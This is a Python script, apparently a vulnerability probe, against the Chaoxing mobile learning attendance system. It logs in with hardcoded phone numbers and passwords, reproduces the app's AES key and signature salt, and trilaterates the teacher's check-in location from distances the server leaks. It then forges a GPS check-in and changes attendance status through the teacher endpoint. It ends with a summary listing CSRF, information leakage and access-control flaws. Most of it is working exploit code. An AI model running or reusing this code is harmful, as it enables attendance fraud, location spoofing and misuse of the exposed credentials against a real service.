#!/usr/bin/env python3
"""
最终位置签到伪造验证 - 使用另一个位置签到活动
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re, math
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

# 测试所有位置签到活动
location_aids = ["5000139505593", "5000139411280", "5000139410559"]

for location_aid in location_aids:
    print(f"\n{'=' * 80}")
    print(f"测试位置签到活动: aid={location_aid}")
    print(f"{'=' * 80}")

    # 先设为缺勤
    r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
                 data={"uids": puid_s, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
    print(f"  设为缺勤: {r.text[:50]}")
    time.sleep(2)

    # 快速探测 - 测试郑州附近几个点
    def get_dist(lat, lng):
        r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                     data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                           "latitude": str(lat), "longitude": str(lng),
                           "appType": "15", "fid": "0"},
                     headers=ajax_hdr, timeout=10)
        text = r.text
        if "成功" in text:
            return 0, True, text
        m = re.search(r'(\d+\.?\d*)\s*米', text)
        if m:
            return float(m.group(1)), False, text
        return -1, False, text

    # 快速测试3个点
    probes = [
        (34.79, 113.67),
        (34.78, 113.66),
        (34.80, 113.68),
    ]

    measurements = []
    can_test = True
    for lat, lng in probes:
        dist, success, text = get_dist(lat, lng)
        if success:
            print(f"  ({lat},{lng}): 签到成功！")
            can_test = False
            break
        elif dist > 0:
            measurements.append((lat, lng, dist))
            print(f"  ({lat},{lng}): 距离={dist:.0f}m")
        elif dist == -2:
            print(f"  ({lat},{lng}): 签到已结束")
            can_test = False
            break
        else:
            print(f"  ({lat},{lng}): 异常 - {text[:80]}")
        time.sleep(0.3)

    if not can_test or len(measurements) < 3:
        # 恢复
        r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
                     data={"uids": puid_s, "status": "1", "remark": ""},
                     headers=ajax_hdr, timeout=20)
        continue

    # 三角定位
    def haversine(lat1, lon1, lat2, lon2):
        R = 6371000
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlambda = math.radians(lon2 - lon1)
        a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
        return 2 * R * math.asin(math.sqrt(a))

    lats = [m[0] for m in measurements]
    lngs = [m[1] for m in measurements]
    lat_min, lat_max = min(lats) - 0.02, max(lats) + 0.02
    lng_min, lng_max = min(lngs) - 0.02, max(lngs) + 0.02

    best_error = float('inf')
    best_lat, best_lng = 34.79, 113.67

    # 粗搜索
    step = 0.001
    for lat_i in range(int(lat_min / step), int(lat_max / step) + 1):
        for lng_i in range(int(lng_min / step), int(lng_max / step) + 1):
            t_lat, t_lng = lat_i * step, lng_i * step
            error = sum((haversine(m[0], m[1], t_lat, t_lng) - m[2]) ** 2 for m in measurements)
            if error < best_error:
                best_error = error
                best_lat, best_lng = t_lat, t_lng

    # 精搜索
    step2 = 0.0001
    for lat_i in range(int((best_lat - 0.002) / step2), int((best_lat + 0.002) / step2) + 1):
        for lng_i in range(int((best_lng - 0.002) / step2), int((best_lng + 0.002) / step2) + 1):
            t_lat, t_lng = lat_i * step2, lng_i * step2
            error = sum((haversine(m[0], m[1], t_lat, t_lng) - m[2]) ** 2 for m in measurements)
            if error < best_error:
                best_error = error
                best_lat, best_lng = t_lat, t_lng

    print(f"  三角定位: ({best_lat:.6f},{best_lng:.6f}), 误差={math.sqrt(best_error/len(measurements)):.0f}m")

    # 用计算位置尝试签到
    dist, success, text = get_dist(best_lat, best_lng)
    if success:
        print(f"  *** 位置签到伪造成功！坐标=({best_lat:.6f},{best_lng:.6f}) ***")
    elif dist >= 0:
        print(f"  计算位置距离: {dist:.0f}m, {text[:80]}")

        # 微调
        for dlat in [-0.0002, -0.0001, 0, 0.0001, 0.0002]:
            for dlng in [-0.0002, -0.0001, 0, 0.0001, 0.0002]:
                if dlat == 0 and dlng == 0:
                    continue
                d, s, t = get_dist(best_lat + dlat, best_lng + dlng)
                if s:
                    print(f"  *** 位置签到伪造成功！坐标=({best_lat+dlat:.6f},{best_lng+dlng:.6f}) ***")
                    break
                elif d >= 0 and d < dist:
                    print(f"  更近: ({best_lat+dlat:.6f},{best_lng+dlng:.6f}), 距离={d:.0f}m")
            else:
                continue
            break
    else:
        print(f"  签到失败: {text[:80]}")

    # 恢复
    r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
                 data={"uids": puid_s, "status": "1", "remark": ""},
                 headers=ajax_hdr, timeout=20)
    print(f"  恢复: {r.text[:50]}")

# ======================================================================
# 最终汇总
# ======================================================================
print(f"\n{'=' * 80}")
print("最终汇总")
print("=" * 80)
print("""
已确认的漏洞:

1. [HIGH] CSRF - /pptSign/updateSignStatusByUidsV2
   - 无CSRF Token保护
   - 支持GET方式（最简单的CSRF）
   - 不检查Referer
   - 可实际修改签到状态
   - 攻击场景: 诱导教师访问恶意URL即可修改任意学生签到状态

2. [MEDIUM] 信息泄露 - 位置签到距离泄露
   - 服务端返回学生位置到教师位置的精确距离
   - 可通过三角定位法反推教师指定位置（误差<5m）
   - 攻击场景: 学生可确定教师设定的签到位置

3. [MEDIUM] 位置签到伪造
   - stuSignajax接受任意经纬度参数
   - 服务端仅校验距离，不验证位置来源
   - 配合信息泄露可精确伪造签到位置
   - 攻击场景: 学生可伪造GPS坐标完成位置签到

4. [LOW] 假success - /newsign/updateSignStatus
   - API返回"success"但实际不修改数据
   - 学生可调用教师级API（越权）
   - 不存在的activeId返回500（信息泄露）
   - 攻击场景: 误导性响应可能导致安全审计误判

5. [LOW] 越权访问 - /newsign/updateSignStatus
   - 学生可调用教师级签到状态修改接口
   - 虽然不修改数据，但应返回权限错误
   - 攻击场景: 权限校验缺失
""")
